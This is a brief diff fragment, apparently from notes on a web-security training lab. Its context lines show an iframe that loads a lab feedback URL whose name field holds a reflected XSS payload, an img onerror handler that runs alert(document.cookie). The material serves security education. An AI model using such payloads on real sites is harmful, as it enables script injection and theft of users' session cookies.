@@ -29,3 +29,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 <iframe sandbox="allow-forms"
 src="https://acc51f981fe98dac80180fbc00c20017.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
 ```
+
+
